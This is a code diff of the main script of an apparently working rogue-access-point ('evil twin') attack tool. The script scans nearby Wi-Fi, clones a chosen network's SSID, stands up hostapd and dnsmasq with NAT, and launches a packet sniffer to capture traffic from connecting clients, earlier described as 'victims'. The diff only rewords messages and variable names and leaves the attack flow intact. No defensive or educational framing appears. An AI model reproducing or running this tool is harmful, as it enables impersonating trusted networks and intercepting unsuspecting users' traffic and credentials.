@@ -22,57 +22,57 @@ def handle_exit(sig, frame):
 
 def main():
     if os.geteuid() != 0:
-        print("[!] Run as root: sudo python main.py")
+        print("[!] need root - try: sudo python main.py")
         sys.exit(1)
 
     signal.signal(signal.SIGINT, handle_exit)
     signal.signal(signal.SIGTERM, handle_exit)
 
-    # Step 1 — Enable monitor mode and scan
-    print(f"[*] Enabling monitor mode on {INTERFACE}...")
-    mon_iface = enable_monitor_mode(INTERFACE)
+    # step 1 - monitor mode + scan
+    print(f"[*] putting {INTERFACE} in monitor mode...")
+    mon_if = enable_monitor_mode(INTERFACE)
 
-    print("[*] Scanning for nearby networks...")
-    networks = scan_networks(mon_iface)
+    print("[*] scanning nearby wifi...")
+    nets = scan_networks(mon_if)
 
-    if not networks:
-        print("[!] No networks found. Check your adapter.")
-        disable_monitor_mode(mon_iface)
+    if not nets:
+        print("[!] no networks found, check the adapter maybe?")
+        disable_monitor_mode(mon_if)
         sys.exit(1)
 
-    # Step 2 — Ask user which network to mimic
-    target = prompt_user_selection(networks)
-    print(f"\n[*] Target: {target['ssid']} (Channel {target.get('channel', 6)})")
+    # pick which ssid to clone
+    target = prompt_user_selection(nets)
+    print(f"\n[*] going after: {target['ssid']} (ch {target.get('channel', 6)})")
 
-    # Step 3 — Switch back to managed, configure AP
-    print("[*] Disabling monitor mode...")
-    disable_monitor_mode(mon_iface)
+    # back to managed mode, set up the ap
+    print("[*] turning off monitor mode")
+    disable_monitor_mode(mon_if)
 
-    print("[*] Configuring interface...")
+    print("[*] configuring iface...")
     configure_interface(INTERFACE)
 
-    print("[*] Writing AP configs...")
+    print("[*] writing hostapd/dnsmasq configs")
     write_hostapd_conf(target["ssid"], target.get("channel", 6), INTERFACE)
     write_dnsmasq_conf(INTERFACE)
 
-    print("[*] Enabling routing and NAT...")
+    print("[*] enabling nat/routing")
     enable_routing(OUTBOUND)
 
-    print("[*] Starting hostapd...")
+    print("[*] starting hostapd")
     processes.append(start_hostapd())
 
-    print("[*] Starting dnsmasq...")
+    print("[*] starting dnsmasq")
     processes.append(start_dnsmasq())
 
-    # Step 4 — Start sniffer
-    print("[*] Starting sniffer...")
-    sniffer = subprocess.Popen([sys.executable, "core/sniffer.py"])
-    processes.append(sniffer)
+    # fire up the sniffer
+    print("[*] starting packet sniffer...")
+    sniff_proc = subprocess.Popen([sys.executable, "core/sniffer.py"])
+    processes.append(sniff_proc)
 
-    print(f"\n[+] Rogue AP '{target['ssid']}' is live. Waiting for victims...")
-    print("[*] Press Ctrl+C to stop.\n")
+    print(f"\n[+] rogue ap '{target['ssid']}' is running, waiting for clients")
+    print("[*] ctrl+c to stop\n")
 
-    # Keep running until Ctrl+C
+    # just hang here
     for p in processes:
         p.wait()
 
